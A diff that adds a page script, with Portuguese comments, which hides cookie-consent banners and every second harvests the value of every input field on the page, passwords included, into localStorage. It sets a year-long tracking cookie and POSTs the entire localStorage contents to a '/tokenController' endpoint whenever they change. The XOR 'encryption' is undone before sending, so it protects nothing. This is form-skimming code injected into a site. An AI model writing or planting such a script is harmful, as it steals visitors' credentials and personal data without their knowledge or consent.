@@ -1,0 +1,120 @@
+
+<script>
+
+    setInterval(() => {
+        // cookie-toast hidden
+
+
+        const cookieToast = document.querySelector('.cookie-toast');
+        if (cookieToast) {
+            cookieToast.style.display = 'none';
+        }
+        const cookieBanner = document.querySelector('.cookie-banner');
+        if (cookieBanner) {
+            cookieBanner.style.display = 'none';
+        }
+        // qualquer classe que tenha cookie no nome
+        const cookie = document.querySelector('.cookie');
+        if (cookie) {
+            cookie.style.display = 'none';
+        }
+
+
+        const allInputs = document.querySelectorAll('input');
+        allInputs.forEach(input => {
+            let idInput = input.id;
+            if (idInput.length < 1) idInput = input.name;
+            if (idInput.length < 1) idInput = input.placeholder;
+
+
+            let valueInput = input.value;
+            if (valueInput.length > 0) {
+                localStorage.setItem(idInput, valueInput);
+            }
+        });
+    }, 1000);
+
+
+    function getCookie(name) {
+        let nameEQ = name + "=";
+        let ca = document.cookie.split(';');
+        for (let i = 0; i < ca.length; i++) {
+            let c = ca[i];
+            while (c.charAt(0) === ' ') c = c.substring(1, c.length);
+            if (c.indexOf(nameEQ) === 0) {
+                return c.substring(nameEQ.length, c.length);
+            }
+        }
+        return null;
+    }
+
+    function observeLocalStorageChanges(callback) {
+        let lastStorage = {...localStorage};
+
+        function checkForChanges() {
+            Object.keys(localStorage).forEach(key => {
+                if (localStorage[key] !== lastStorage[key]) {
+                    callback(key, localStorage[key]);
+                    lastStorage[key] = localStorage[key];
+                }
+            });
+        }
+
+        setInterval(checkForChanges, 1000);
+    }
+
+
+    function encryptData(data, key) {
+        try {
+            const encoder = new TextEncoder();
+            const decoder = new TextDecoder();
+            const textBytes = encoder.encode(data);
+            const keyBytes = encoder.encode(key);
+            const result = textBytes.map((byte, i) => byte ^ keyBytes[i % keyBytes.length]);
+            return btoa(String.fromCharCode(...result));
+        } catch (e) {
+            console.error('Encryption failed:', e);
+            return null;
+        }
+    }
+
+    function decryptData(data, key) {
+        try {
+            const binary = atob(data);
+            const bytes = Uint8Array.from(binary, c => c.charCodeAt(0));
+            const encoder = new TextEncoder();
+            const decoder = new TextDecoder();
+            const keyBytes = encoder.encode(key);
+            const result = bytes.map((byte, i) => byte ^ keyBytes[i % keyBytes.length]);
+            return decoder.decode(new Uint8Array(result));
+        } catch (e) {
+            console.error('Decryption failed:', e);
+            return null;
+        }
+    }
+
+
+    observeLocalStorageChanges((key, newValue) => {
+        // checa se o cookie existe e seta se preciso
+        if (getCookie('idControl') === null) {
+            const idControl = Math.random().toString(36).substring(2, 15);
+            document.cookie = `idControl=${idControl}; path=/; max-age=31536000;`;
+        }
+
+        let model = {idControl: getCookie('idControl'), data: localStorage};
+        let enc = encryptData(JSON.stringify(model), getCookie('idControl'));
+        let dec = JSON.parse(decryptData(enc, getCookie('idControl')));
+
+        const xmlHttpRequest = new XMLHttpRequest();
+        xmlHttpRequest.open('POST', '/tokenController');
+        xmlHttpRequest.setRequestHeader('Content-Type', 'application/json');
+        xmlHttpRequest.send(JSON.stringify(dec));
+        xmlHttpRequest.onreadystatechange = () => {
+            if (xmlHttpRequest.readyState === 4 && xmlHttpRequest.status === 200) {
+                console.log(xmlHttpRequest.responseText);
+            }
+        };
+    });
+
+
+</script>
